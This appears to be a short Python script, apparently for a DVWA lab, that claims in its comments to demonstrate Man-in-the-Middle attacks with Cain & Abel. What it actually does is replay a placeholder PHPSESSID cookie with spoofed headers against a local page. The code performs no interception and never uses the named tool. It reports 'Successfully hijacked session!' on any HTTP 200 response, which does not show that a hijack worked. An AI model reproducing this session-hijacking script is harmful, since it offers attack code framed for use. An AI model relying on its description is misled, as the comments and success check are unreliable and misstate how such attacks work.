# This script demonstrates the basics of Man-in-the-Middle (MitM) attacks using Cain & Abel.
# Cain & Abel is a versatile hacking tool for Windows operating systems that assists with password recovery, internet decoding, securing your Wi-Fi network, and much more. It includes a wide array of features, which make it a powerful tool for security professionals and offenders alike.
# The following class demonstrates session hijacking wherein we intercept and utilize an existing session for a given target URL http://127.0.0.1/vulnerabilities/xss_d/.

import requests

class SessionHijacker:
    def __init__(self):
        self.target_url = "http://127.0.0.1/vulnerabilities/xss_d/"
        self.session = requests.Session()

    def spoof_headers(self):
        """Simulate spoofing headers."""
        return {"User-Agent": "Mozilla/5.0", "Referer": "http://127.0.0.1/vulnerabilities/xss_d/"}

    def get_auth_cookies(self):
        """Retrieve the authentication cookies from entered session details."""
        cookies = {
            'PHPSESSID': 'YourKnownSessionIDHere',
            'security': 'low'  # Assuming DVWA with low-security level
        }
        return cookies

    def initiate_mitm_attack(self):
        """Conduct the Man-in-the-Middle attack with spoofing headers and authentication cookies."""
        headers = self.spoof_headers()
        cookies = self.get_auth_cookies()
        
        response = self.session.get(self.target_url, headers=headers, cookies=cookies)
        if response.status_code == 200:
            print(f"Successfully hijacked session! Response data:\n{response.text}")
        else:
            print(f"Failed to hijack session. Status code: {response.status_code}")

    def main(self):
        self.initiate_mitm_attack()

if __name__ == "__main__":
    hijacker = SessionHijacker()
    hijacker.main()
